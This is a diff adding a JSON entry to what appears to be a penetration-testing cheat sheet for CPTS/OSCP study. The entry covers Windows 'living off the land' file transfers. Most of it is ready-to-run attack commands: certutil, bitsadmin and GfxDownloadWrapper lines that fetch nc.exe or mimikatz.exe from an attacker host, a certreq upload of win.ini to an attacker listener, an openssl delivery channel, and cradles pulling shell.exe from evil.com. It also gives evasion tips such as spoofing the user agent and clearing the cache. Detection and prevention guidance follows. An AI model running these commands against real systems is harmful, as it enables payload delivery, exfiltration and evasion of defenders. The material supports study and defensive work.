@@ -1,0 +1,114 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "bitsadmin",
+    "certutil",
+    "openssl"
+  ],
+  "tags": [
+    "lolbins",
+    "living-off-the-land",
+    "bitsadmin",
+    "certutil"
+  ],
+  "category": "File Transfers",
+  "subcategory": "LOLBins",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 07: File Transfers",
+  "examples": [
+    {
+      "label": "Download nc.exe with certutil",
+      "command": "certutil.exe -urlcache -split -f http://10.10.14.12:8000/nc.exe nc.exe"
+    }
+  ],
+  "notes": "Find more: LOLBAS (/download /upload functions), GTFOBins (+file download / +file upload).",
+  "references": [
+    {
+      "title": "LOLBAS Project",
+      "url": "https://lolbas-project.github.io/"
+    },
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/"
+    },
+    {
+      "title": "HTB Academy - File Transfers",
+      "url": "https://academy.hackthebox.com/module/details/24"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "win-ps-download",
+      "rel": "alternative",
+      "note": "Standard PS cradle."
+    },
+    {
+      "id": "windows-cred-locations",
+      "rel": "next",
+      "note": "Now hunt Windows creds."
+    }
+  ],
+  "id": "lolbins-transfer",
+  "name": "Living off the Land - LOLBin Transfers",
+  "command": "certutil.exe -urlcache -split -f http://<ip>:8000/nc.exe nc.exe",
+  "description": "Use trusted signed binaries already on the system to download files - blends into normal activity and dodges application allow-lists. LOLBAS (Windows) / GTFOBins (Linux) catalog them.",
+  "variations": [
+    {
+      "label": "certutil",
+      "command": "certutil.exe -urlcache -split -f http://<lhost>:8000/nc.exe\ncertutil.exe -verifyctl -split -f http://<lhost>:8000/nc.exe"
+    },
+    {
+      "label": "bitsadmin / Start-BitsTransfer",
+      "command": "bitsadmin /transfer wcb /priority foreground http://<lhost>:8000/nc.exe C:\\Users\\<user>\\Desktop\\nc.exe\nImport-Module bitstransfer; Start-BitsTransfer -Source \"http://<lhost>:8000/nc.exe\" -Destination \"C:\\Windows\\Temp\\nc.exe\""
+    },
+    {
+      "label": "certreq upload",
+      "command": "certreq.exe -Post -config http://<lhost>:8000/ c:\\windows\\win.ini   # attacker: sudo nc -lvnp 8000"
+    },
+    {
+      "label": "GfxDownloadWrapper",
+      "command": "GfxDownloadWrapper.exe \"http://<lhost>/mimikatz.exe\" \"C:\\Temp\\nc.exe\""
+    },
+    {
+      "label": "Linux openssl (encrypted channel)",
+      "command": "# attacker: openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem\n#           openssl s_server -quiet -accept 80 -cert cert.pem -key key.pem < /tmp/LinEnum.sh\n# target:   openssl s_client -connect <ip>:80 -quiet > LinEnum.sh"
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1105",
+    "T1027"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Living-Off-The-Land Binaries (certutil -urlcache, bitsadmin, GfxDownloadWrapper, etc.) are signed, trusted Windows tools with a side-effect of downloading files - so they slip past application whitelisting that would block unknown binaries (the module's scenario).",
+    "prerequisites": "Code execution on Windows and egress to the attacker host; a LOLBin present (most are built in).",
+    "impact": "Files downloaded using a trusted, whitelisted binary - bypassing application control that blocks custom tooling.",
+    "detection": "Each LOLBin has a signature: certutil's User-Agent is Microsoft-CryptoAPI, BITS is Microsoft BITS/7.8 (HTB M07); and a trusted binary making an outbound download to an external host is anomalous behaviour. 4688/Sysmon 1 command line (e.g. certutil -urlcache -f) is a high-fidelity indicator.",
+    "artifacts": "The LOLBin's distinctive UA in proxy logs; certutil/bitsadmin command line with a URL; the downloaded file (and certutil's urlcache).",
+    "prevention": "[MITRE T1105 M1037] Web filtering + domain whitelisting. Command-line deny-listing/alerting on known LOLBin download patterns (certutil -urlcache, bitsadmin /transfer); EDR behavioural rules; where feasible, block/monitor the LOLBins.",
+    "evasion": "LOLBins evade application whitelisting by design; spoof the UA and use HTTPS to reduce network signal; clear certutil's urlcache to limit artifacts.",
+    "sources": [
+      "HTB M07",
+      "MITRE T1105"
+    ],
+    "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
+    "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+  }
+}
